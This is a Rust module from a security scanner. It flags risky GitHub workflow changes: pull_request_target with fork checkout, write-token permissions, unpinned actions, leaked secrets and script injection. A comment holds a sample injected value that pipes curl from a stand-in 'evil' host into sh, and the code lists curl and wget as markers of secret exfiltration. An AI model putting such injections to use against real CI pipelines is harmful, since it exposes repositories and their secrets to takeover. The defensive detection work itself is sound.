//! GitHub workflows and action definitions: what lets a pull request take over CI.
//!
//! Only added lines are read. Whether a line is part of a script is told from
//! the lines the change adds before it: after `run: |` or `script: |`, more
//! indented lines are script; after another key's block (`body: |`) they are
//! text; a line that is no `key: value` and follows no such key is taken for
//! script, since in a workflow almost every multi-line value is one. A
//! `key: ${{ … }}` line (`env:`, `with:`, `if:`) is a value GitHub passes as
//! data, the safe form, and is not reported.

use super::{CI_INJECTION, CI_PERMISSIONS, CI_PR_TARGET, CI_SECRET_OUT, CI_UNPINNED};
use super::{Change, Hit, Level, shown};

/// Event fields a pull request's or an issue's author writes: expanded into a
/// script, they are code the author chose (`a"; curl evil | sh; "`).
const AUTHOR_FIELDS: &[&str] = &[
    ".title",
    ".body",
    ".message",
    ".head_ref",
    ".head.ref",
    ".head.label",
    ".head.repo.default_branch",
    ".author.name",
    ".author.email",
    ".committer.name",
    ".committer.email",
    ".page_name",
];

/// Where a line sits.
#[derive(Clone, Copy, PartialEq, Eq)]
enum Context {
    Script,
    Text,
}

pub(super) fn scan(change: &Change<'_>, hits: &mut Vec<Hit>) {
    let mut trigger = None;
    let mut checkout = None;
    let mut writes: Vec<(usize, String)> = Vec::new();
    for block in change.runs() {
        // (indent, context) of the block scalar being read
        let mut open: Option<(usize, Context)> = None;
        for (line, text) in block {
            let line = *line;
            let code = text.split(" #").next().unwrap_or(text);
            if code.trim_start().starts_with('#') {
                continue;
            }
            let indent = text.len() - text.trim_start().len();
            if open.is_some_and(|(i, _)| indent <= i) {
                open = None;
            }
            let key = yaml_key(code);
            let context = match (open, key) {
                // inside a block scalar, a line is its text whatever it looks like
                (Some((_, ctx)), _) => ctx,
                (None, Some((k, value))) => {
                    let script = matches!(k, "run" | "script");
                    let ctx = if script {
                        Context::Script
                    } else {
                        Context::Text
                    };
                    if value.starts_with(['|', '>']) {
                        open = Some((indent, ctx));
                        Context::Text
                    } else {
                        ctx
                    }
                }
                (None, None) => Context::Script,
            };
            // what a block scalar holds is not a key of the workflow
            let key = if open.is_some_and(|(i, _)| indent > i) {
                None
            } else {
                key
            };
            let lower = code.to_ascii_lowercase();
            if lower.contains("pull_request_target") {
                trigger.get_or_insert(line);
            }
            let head = [
                "github.event.pull_request.head.",
                "github.head_ref",
                "refs/pull/",
            ];
            let names_head = head.iter().any(|h| lower.contains(h));
            if (key.is_some_and(|(k, _)| k == "ref") && names_head)
                || lower.contains("gh pr checkout")
                || (lower.contains("git fetch") && names_head)
            {
                checkout.get_or_insert(line);
            }
            permissions(line, key, &mut writes, hits);
            if let Some(("uses", value)) = key {
                unpinned(line, value, hits);
            }
            if context == Context::Script {
                expressions(line, code, hits);
            }
        }
    }
    if !writes.is_empty() {
        let scopes: Vec<&str> = writes.iter().map(|(_, s)| s.as_str()).collect();
        hits.push(Hit::new(
            CI_PERMISSIONS,
            Level::Review,
            writes[0].0,
            format!(
                "gives the workflow's token write access ({}): a step that runs code from the \
                 change can push, publish or edit the repository with it",
                scopes.join(", ")
            ),
        ));
    }
    match (trigger, checkout) {
        (Some(_), Some(line)) => hits.push(Hit::new(
            CI_PR_TARGET,
            Level::Deny,
            line,
            "runs on pull_request_target and checks out the pull request's code: a fork's \
             code then runs with the base repository's secrets and write token"
                .to_owned(),
        )),
        (Some(line), None) => hits.push(Hit::new(
            CI_PR_TARGET,
            Level::Review,
            line,
            "adds the pull_request_target trigger: the workflow runs on forks' pull requests \
             with the base repository's secrets and write token; it must never run their code"
                .to_owned(),
        )),
        _ => {}
    }
}

/// `key: value` at the start of `text` (after a list's `- `), with the value trimmed.
fn yaml_key(text: &str) -> Option<(&str, &str)> {
    let t = text.trim_start();
    let t = t.strip_prefix("- ").unwrap_or(t).trim_start();
    let (key, value) = t.split_once(':')?;
    let key = key.trim_matches(['"', '\'']);
    let valid = !key.is_empty()
        && key
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || "_-.".contains(c));
    (valid && (value.is_empty() || value.starts_with([' ', '\t']))).then(|| (key, value.trim()))
}

fn permissions(
    line: usize,
    key: Option<(&str, &str)>,
    writes: &mut Vec<(usize, String)>,
    hits: &mut Vec<Hit>,
) {
    let Some((key, value)) = key else {
        return;
    };
    if key == "permissions" && value == "write-all" {
        hits.push(Hit::new(
            CI_PERMISSIONS,
            Level::Review,
            line,
            "gives the workflow's token `write-all`: every step can push, publish, change \
             releases and edit the repository's settings"
                .to_owned(),
        ));
    } else if value == "write" {
        writes.push((line, key.to_owned()));
    }
}

fn unpinned(line: usize, value: &str, hits: &mut Vec<Hit>) {
    let action = value.trim_matches(['"', '\'']);
    if action.starts_with("./") || action.is_empty() {
        return;
    }
    let pinned = match action.strip_prefix("docker://") {
        Some(image) => image.contains("@sha256:"),
        None => action
            .rsplit_once('@')
            .is_some_and(|(_, r)| r.len() == 40 && r.chars().all(|c| c.is_ascii_hexdigit())),
    };
    if !pinned {
        hits.push(Hit::new(
            CI_UNPINNED,
            Level::Review,
            line,
            format!(
                "uses `{}` at a tag or branch its owner can move to other code; pin the full \
                 commit SHA (or image digest) and keep the tag in a comment",
                shown(action)
            ),
        ));
    }
}

/// The `${{ … }}` expressions of a script line.
fn expressions(line: usize, code: &str, hits: &mut Vec<Hit>) {
    let lower = code.to_ascii_lowercase();
    let mut rest = lower.as_str();
    let mut found: Option<Hit> = None;
    while let Some(start) = rest.find("${{") {
        let after = &rest[start + 3..];
        let Some(end) = after.find("}}") else {
            break;
        };
        let expr = after[..end].trim();
        rest = &after[end + 2..];
        let hit = judge(line, expr, &lower);
        if hit.as_ref().map(|h| h.level) > found.as_ref().map(|h| h.level) {
            found = hit;
        }
    }
    hits.extend(found);
}

fn judge(line: usize, expr: &str, script: &str) -> Option<Hit> {
    if expr.contains("secrets") {
        // `echo "$KEY" > key.pem` and `echo … | docker login --password-stdin` hand it on
        let handed_on = script.contains('>') || script.contains('|');
        let printed = ["echo ", "printf ", "print(", "console.log", "write-host"]
            .iter()
            .any(|p| script.contains(p))
            && !handed_on
            || expr.contains("tojson(secrets");
        if printed {
            return Some(Hit::new(
                CI_SECRET_OUT,
                Level::Deny,
                line,
                "prints a secret in a script: masking misses encoded or split copies, and the \
                 log is readable by everyone who can read the run"
                    .to_owned(),
            ));
        }
        if ["curl ", "wget ", "invoke-webrequest", "iwr "]
            .iter()
            .any(|p| script.contains(p))
        {
            return Some(Hit::new(
                CI_SECRET_OUT,
                Level::Review,
                line,
                "hands a secret to curl or wget in a script: check the address it goes to is \
                 the service the secret is for"
                    .to_owned(),
            ));
        }
        return None;
    }
    let event = expr.contains("github.event.") || expr.contains("github.head_ref");
    if !(event || expr.contains("inputs.")) {
        return None;
    }
    let authored = event
        && AUTHOR_FIELDS
            .iter()
            .any(|f| expr.contains(f) || expr.ends_with(&f[1..]));
    let (level, why) = if authored {
        (
            Level::Deny,
            "text a pull request's or issue's author writes",
        )
    } else {
        (
            Level::Review,
            "a value from the triggering event or the workflow's inputs",
        )
    };
    Some(Hit::new(
        CI_INJECTION,
        level,
        line,
        format!(
            "expands `${{{{ {} }}}}`, {why}, into a script, where it runs as code; pass it \
             through `env:` and use the variable instead",
            shown(expr)
        ),
    ))
}
